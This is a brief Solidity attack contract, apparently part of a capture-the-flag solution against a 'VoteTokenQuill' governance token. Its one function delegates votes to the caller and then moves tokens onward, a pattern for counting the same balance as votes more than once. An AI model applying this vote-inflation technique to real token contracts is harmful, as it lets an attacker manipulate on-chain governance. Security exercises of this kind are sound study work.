// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./VoteToken.sol";

contract VoteTokenQuillAttack {
    function delegate(address target) public {
        VoteTokenQuill v = VoteTokenQuill(target);
        v.delegate(msg.sender);
        v.transfer(msg.sender, 1000);
    }
}